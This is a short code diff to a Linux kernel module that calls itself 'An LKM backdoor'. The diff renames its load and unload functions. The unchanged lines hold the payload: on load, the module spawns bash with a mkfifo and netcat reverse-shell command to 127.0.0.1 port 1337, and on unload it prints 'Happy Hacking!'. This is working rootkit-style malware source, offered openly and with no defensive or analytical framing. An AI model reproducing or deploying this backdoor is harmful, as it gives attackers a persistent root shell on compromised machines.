@@ -8,7 +8,7 @@ MODULE_AUTHOR("@Pink_P4nther");
 MODULE_DESCRIPTION("An LKM backdoor");
 MODULE_VERSION("1.0");
 
-static int __init run(void)
+static int __init mload(void)
 {
 	char *envp[] = {"HOME=/root","TERM=xterm",NULL};
 	char *argv[] = {"/bin/bash","-c","/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc 127.0.0.1 1337 >/tmp/pinkit",NULL};
@@ -18,10 +18,10 @@ static int __init run(void)
 	return 0;
 }
 
-static void __exit dun(void)
+static void __exit munload(void)
 {
 	printk(KERN_INFO "[+] Happy Hacking!\n");
 }
 
-module_init(run);
-module_exit(dun);
+module_init(mload);
+module_exit(munload);
